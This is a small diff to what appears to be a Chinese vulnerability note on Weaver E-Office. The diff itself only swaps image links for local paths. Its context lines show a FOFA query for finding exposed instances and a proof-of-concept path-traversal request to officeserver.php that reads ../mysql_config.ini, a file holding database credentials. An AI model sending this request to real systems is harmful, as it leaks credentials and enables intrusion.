@@ -20,7 +20,7 @@ app="泛微-EOffice"
 
 登录页面
 
-![image-20220520140739224](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201407281.png)
+![image-20220520140739224](./images/202205201407281.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="泛微-EOffice"
 /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
 ```
 
-![image-20220520140749985](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201407034.png)
+![image-20220520140749985](./images/202205201407034.png)
